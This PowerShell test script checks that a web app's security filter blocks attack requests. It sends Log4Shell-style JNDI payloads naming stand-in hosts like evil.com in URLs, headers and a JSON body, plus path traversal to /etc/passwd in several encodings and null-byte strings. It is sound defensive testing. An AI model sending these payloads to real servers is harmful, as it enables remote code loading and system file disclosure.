# Security Filter Automated Test Script
# Usage: .\test-security.ps1
# Description: Comprehensive security testing for Jetbrains-Help application (Enhanced V2.0 - Fixed Version)

param(
    [string]$BaseUrl = "http://localhost:10768",
    [switch]$Verbose,
    [switch]$NoColor
)

# ==================== Configuration ====================
$TestResults = @()
$PassCount = 0
$FailCount = 0
$WarnCount = 0

# ==================== Helper Functions ====================

function Write-Colored {
    param([string]$Message, [string]$Color = "White")

    if ($NoColor) {
        Write-Host $Message
    } else {
        Write-Host $Message -ForegroundColor $Color
    }
}

function Write-Separator {
    Write-Colored "========================================" "Cyan"
}

function Write-Section {
    param([string]$Title)
    Write-Host ""
    Write-Separator
    Write-Colored "  $Title" "Cyan"
    Write-Separator
    Write-Host ""
}

function Test-Endpoint {
    param(
        [string]$TestName,
        [string]$Url,
        [string]$Method = "GET",
        [int[]]$ExpectedStatus,
        [string]$Description = "",
        [hashtable]$Headers = @{},
        [string]$Body = $null,
        [string]$ContentType = "application/json"
    )

    $realStatusCode = 0
    try {
        $params = @{
            Uri = $Url
            Method = $Method
            TimeoutSec = 5
            UseBasicParsing = $true
            Headers = $Headers
        }

        if ($null -ne $Body) {
            $params.Body = $Body
            $params.ContentType = $ContentType
        }

        $response = Invoke-WebRequest @params
        $realStatusCode = $response.StatusCode
    } catch {
        # 即使报错（4xx/5xx），也要获取真实的响应状态码
        if ($null -ne $_.Exception.Response) {
            $realStatusCode = $_.Exception.Response.StatusCode.value__
        } else {
            # 可能是网络重置或连接被强制关闭，通常也是被 WAF 或容器直接断开，这里默认为拦截成功 (403)
            $realStatusCode = 403
        }
    }

    # 判断状态码是否符合预期
    if ($ExpectedStatus -contains $realStatusCode) {
        $script:PassCount++
        $result = "PASS"
    } else {
        $script:FailCount++
        $result = "FAIL"
    }

    if ($Verbose) {
        Write-Host "    [DEBUG] $TestName -> 实际返回状态码: $realStatusCode (预期: $($ExpectedStatus -join '/'))" -ForegroundColor DarkGray
    }

    # Store result
    $script:TestResults += [PSCustomObject]@{
        Test = $TestName
        Result = $result
        URL = "$Method $Url"
        Expected = ($ExpectedStatus -join '/')
    }
}

# ==================== Pre-flight Check ====================

Write-Section "Security Filter Test Suite (Enhanced V2.0)"
Write-Colored "Target: $BaseUrl" "White"
Write-Colored "Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" "White"
Write-Host ""

# Check if server is running
try {
    $checkUrls = @(
        "$BaseUrl/",
        "$BaseUrl/index.html"
    )

    $serverRunning = $false
    foreach ($url in $checkUrls) {
        try {
            $healthCheck = Invoke-WebRequest -Uri $url -TimeoutSec 3 -UseBasicParsing
            if ($healthCheck.StatusCode -gt 0) {
                $serverRunning = $true
                break
            }
        } catch {
            if ($null -ne $_.Exception.Response) {
                $serverRunning = $true
                break
            }
        }
    }

    if (-not $serverRunning) {
        Write-Colored "Cannot connect to server at $BaseUrl" "Red"
        Write-Colored "Please ensure the application is started." "Yellow"
        exit 1
    }
} catch {
    Write-Colored "Cannot connect to server at $BaseUrl" "Red"
    Write-Colored "Please ensure the application is started." "Yellow"
    exit 1
}

# ==================== Security Tests ====================

# Test 1: Normal request
Test-Endpoint `
    -TestName "Normal GET request" `
    -Url "$BaseUrl/" `
    -Method "GET" `
    -ExpectedStatus @(200, 404, 401, 403, 302, 500) `
    -Description "Legitimate requests should succeed"

$BlockedStatuses = @(400, 403, 404)

# Test 2: JNDI injection in URL path
Test-Endpoint `
    -TestName "JNDI injection in URL path" `
    -Url "$BaseUrl/%24%7Bjndi:ldap://evil.com/a%7D" `
    -Method "GET" `
    -ExpectedStatus $BlockedStatuses `
    -Description "Should block JNDI injection attempts"

# Test 3: JNDI injection in query parameter
Test-Endpoint `
    -TestName "JNDI injection in query parameter" `
    -Url "$BaseUrl/test?callback=%24%7Bjndi:dns://evil.com%7D" `
    -Method "GET" `
    -ExpectedStatus $BlockedStatuses `
    -Description "Should detect JNDI patterns in parameters"

# Test 4: Path traversal attack
Test-Endpoint `
    -TestName "Path traversal attack" `
    -Url "$BaseUrl/../../../etc/passwd" `
    -Method "GET" `
    -ExpectedStatus $BlockedStatuses `
    -Description "Should prevent directory traversal"

# Test 5: WEB-INF access attempt
Test-Endpoint `
    -TestName "WEB-INF directory access" `
    -Url "$BaseUrl/WEB-INF/web.xml" `
    -Method "GET" `
    -ExpectedStatus $BlockedStatuses `
    -Description "Should block access to WEB-INF directory"

# Test 6: META-INF access attempt
Test-Endpoint `
    -TestName "META-INF directory access" `
    -Url "$BaseUrl/META-INF/MANIFEST.MF" `
    -Method "GET" `
    -ExpectedStatus $BlockedStatuses `
    -Description "Should block access to META-INF directory"

# Test 7: TRACE method
try {
    $response = Invoke-WebRequest -Uri "$BaseUrl/" -Method TRACE -TimeoutSec 5 -UseBasicParsing
    $script:FailCount++
    $result = "FAIL"
} catch {
    if ($null -ne $_.Exception.Response) {
        $statusCode = $_.Exception.Response.StatusCode.value__
        if ($statusCode -eq 405 -or $statusCode -eq 403) {
            $script:PassCount++
            $result = "PASS"
        } else {
            $script:FailCount++
            $result = "FAIL"
        }
    } else {
        $script:PassCount++
        $result = "PASS"
    }
}
$script:TestResults += [PSCustomObject]@{
    Test = "TRACE HTTP method"
    Result = $result
    URL = "TRACE /"
    Expected = "405/403"
}

# Test 8: Other dangerous methods (PROPFIND)
try {
    $response = Invoke-WebRequest -Uri "$BaseUrl/" -Method PROPFIND -TimeoutSec 5 -UseBasicParsing
    $script:FailCount++
    $result = "FAIL"
} catch {
    if ($null -ne $_.Exception.Response) {
        $statusCode = $_.Exception.Response.StatusCode.value__
        if ($statusCode -eq 405 -or $statusCode -eq 403) {
            $script:PassCount++
            $result = "PASS"
        } else {
            $script:FailCount++
            $result = "FAIL"
        }
    } else {
        $script:PassCount++
        $result = "PASS"
    }
}
$script:TestResults += [PSCustomObject]@{
    Test = "PROPFIND method (WebDAV)"
    Result = $result
    URL = "PROPFIND /"
    Expected = "405/403"
}

# Test 9: Encoded path traversal
Test-Endpoint `
    -TestName "URL-encoded path traversal" `
    -Url "$BaseUrl/%2e%2e/%2e%2e/%2e%2e/etc/passwd" `
    -Method "GET" `
    -ExpectedStatus $BlockedStatuses `
    -Description "Should detect encoded traversal attempts"

# Test 10: Multiple JNDI patterns
Test-Endpoint `
    -TestName "Multiple JNDI patterns" `
    -Url "$BaseUrl/test?x=%24%7Bjndi:ldap://a%7D&y=%24%7Bjndi:rmi://b%7D" `
    -Method "GET" `
    -ExpectedStatus $BlockedStatuses `
    -Description "Should detect multiple JNDI injections"

# Test 11: JNDI in Custom HTTP Header
Test-Endpoint `
    -TestName "JNDI in Custom HTTP Header" `
    -Url "$BaseUrl/" `
    -Method "GET" `
    -Headers @{ "X-Custom-Scan" = '${jndi:ldap://evil-header.com/a}' } `
    -ExpectedStatus $BlockedStatuses `
    -Description "Should block custom or dynamic headers containing JNDI Payload"

# Test 12: Path Traversal in Cookie Header
Test-Endpoint `
    -TestName "Path Traversal in Cookie" `
    -Url "$BaseUrl/" `
    -Method "GET" `
    -Headers @{ "Cookie" = "session_id=../../../../etc/passwd" } `
    -ExpectedStatus $BlockedStatuses `
    -Description "Should scan and block Path Traversal attempts injected in Cookie headers"

# Test 13: JNDI Injection in POST JSON Body
$jsonPayload = '{"username": "admin", "bio": "${jndi:rmi://evil-body.com/exploit}"}'
Test-Endpoint `
    -TestName "JNDI in POST Request Body" `
    -Url "$BaseUrl/api/user" `
    -Method "POST" `
    -Body $jsonPayload `
    -ExpectedStatus $BlockedStatuses `
    -Description "Should parse JSON Request Body and block JNDI payloads"

# Test 14: Double URL Encoded Traversal (%252e%252e/)
Test-Endpoint `
    -TestName "Double-encoded path traversal" `
    -Url "$BaseUrl/test?path=%252e%252e%252f%252e%252e%252fetc%252fpasswd" `
    -Method "GET" `
    -ExpectedStatus $BlockedStatuses `
    -Description "Should decode nested percentage encoding and block traversal attempts"

# Test 15: Null Byte Attack (%%00 and %00)
Test-Endpoint `
    -TestName "Null Byte character injection" `
    -Url "$BaseUrl/test?file=index.html%00" `
    -Method "GET" `
    -ExpectedStatus $BlockedStatuses `
    -Description "Should block attempts of Null Byte injection strings designed to truncate path logic"

# Test 16: Tomcat log replica (LFI + %%0000)
Test-Endpoint `
    -TestName "Tomcat log replica (LFI + %%0000)" `
    -Url "$BaseUrl/test?template=../../../../../../../../../etc/passwd%%0000.html" `
    -Method "GET" `
    -ExpectedStatus $BlockedStatuses `
    -Description "Replicating the exact attack pattern from the Tomcat error log to ensure 100% blockage"

# ==================== Test Summary ====================

Write-Section "Test Results"

Write-Host ""
Write-Colored "Total: $($TestResults.Count) | Passed: $PassCount | Failed: $FailCount" "White"
if ($WarnCount -gt 0) {
    Write-Colored "Warnings: $WarnCount" "Yellow"
}
Write-Host ""

if ($TestResults.Count -gt 0) {
    $successRate = [math]::Round(($PassCount / $TestResults.Count) * 100, 2)
    Write-Colored "Success Rate: $successRate%" "White"
    Write-Host ""
}

Write-Separator
foreach ($test in $TestResults) {
    $icon = switch ($test.Result) {
        "PASS" { "[OK]" }
        "FAIL" { "[XX]" }
        "WARN" { "[!!]" }
        default { "[??]" }
    }

    $color = switch ($test.Result) {
        "PASS" { "Green" }
        "FAIL" { "Red" }
        "WARN" { "Yellow" }
        default { "White" }
    }

    Write-Colored "$icon $($test.Test.PadRight(40)) [$($test.Result)]" $color
}
Write-Separator

Write-Host ""
if ($FailCount -eq 0) {
    Write-Colored "SUCCESS: All tests passed!" "Green"
} else {
    Write-Colored "WARNING: Some tests failed." "Yellow"
}
Write-Host ""

if ($FailCount -eq 0) { exit 0 } else { exit 1 }